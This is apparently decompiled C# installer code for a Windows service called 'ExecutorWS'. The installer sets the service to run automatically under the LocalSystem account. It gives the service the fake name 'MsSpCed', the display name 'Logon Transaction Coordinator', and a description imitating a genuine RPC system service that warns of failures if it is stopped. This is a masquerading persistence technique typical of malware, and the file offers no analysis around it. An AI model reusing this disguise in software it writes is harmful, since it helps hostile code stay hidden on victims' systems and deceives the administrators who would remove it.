using System.ComponentModel;
using System.Configuration.Install;
using System.ServiceProcess;

namespace ExecutorWS;

[RunInstaller(true)]
public class ProjectInstaller : Installer
{
	private ServiceProcessInstaller process;

	private ServiceInstaller service;

	public ProjectInstaller()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		process = new ServiceProcessInstaller();
		process.set_Account((ServiceAccount)2);
		service = new ServiceInstaller();
		service.set_ServiceName("MsSpCed");
		service.set_StartType((ServiceStartMode)2);
		service.set_Description("Provides transactions for Remote Procedure Call (RPC) service. If this service is stopped, Remote Procedure Call service may fail. If this service is disabled, any services that explicitly depend on it will fail to start.");
		service.set_DisplayName("Logon Transaction Coordinator");
		((Installer)this).get_Installers().Add((Installer)(object)process);
		((Installer)this).get_Installers().Add((Installer)(object)service);
	}
}
